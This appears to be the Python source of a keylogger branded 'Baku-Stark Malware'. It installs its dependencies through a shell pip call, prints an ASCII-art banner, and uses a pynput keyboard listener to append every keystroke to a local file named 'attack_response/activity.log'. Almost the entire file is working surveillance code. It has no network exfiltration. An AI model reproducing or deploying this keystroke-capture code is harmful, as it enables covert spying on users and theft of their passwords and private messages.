import platform
from subprocess import call
from code import Colors, OperationalSys, CurrentTime

try:
    from art import *
    from pynput import keyboard #pip install pynput

except ModuleNotFoundError:
    modules = ["pynput", "art"]
    call("pip install " + " ".join(modules), shell=True)

class KeyLogger:
    def __init__(self, malware : str = "Baku-Stark Malware") -> None:
        self._malware = malware

        self.menu_author()

    @property
    def malware(self):
        return self._malware

    @malware.setter
    def malware(self, new_malware_name : str):
        self._malware = new_malware_name

    def menu_author(self) -> None:
        """
            Menu panel 'Baku Stark'.
        """

        print(Colors.CYAN + "=" * 50 + Colors.END)

        tprint(f"System\n{platform.system()}\n{self._malware}", font="graffiti")
        print(Colors.BLUE + f"- Author : Baku - Stark\n- Language : Python (Version 3.11.2) | Your Version: {platform.python_version()}" + Colors.END)

        print(Colors.CYAN + "=" * 50 + Colors.END)
        print(Colors.BLUE + "== Key Logger ativado! ==" + Colors.END)
    
    def keyPressed(self, key):
        """
            Start Key Looger
        """
        #print(str(key))

        with open("attack_response/activity.log", "a", encoding="utf-8") as file_attack_response:
            char = str(key)

            try:
                if "Key." in char:
                    char = str(key)[3:]
                    #print(char)
                else:
                    char = str(key)[1:-1]
                    #print(char)

                file_attack_response.write(f"'{str(char)}'- ")

            except:
                print("[Error]")
        

if __name__ == '__main__':
    OperationalSys.clean_console()
    key_logger = KeyLogger()
    
    listener = keyboard.Listener(on_press=key_logger.keyPressed)
    listener.start()
    str(input())